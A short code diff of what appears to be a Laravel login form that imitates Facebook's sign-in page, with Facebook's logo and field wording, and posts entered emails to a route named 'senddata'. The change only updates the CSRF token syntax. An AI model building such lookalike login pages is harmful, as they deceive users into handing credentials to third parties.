@@ -85,7 +85,7 @@
           <div class="col-md-5" style="margin-top: -230px;">
           <div id="log">  <center style="margin-top:60px"> <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" class="w-50">  </center></div>
           <form method="POST" action="{{ route("senddata") }}">
-             @csrf
+             {{ csrf_field() }}
               <div class="mb-3">
                 <input type="text" class="form-control" name="email" placeholder="Mobile number or email address"
                   required>
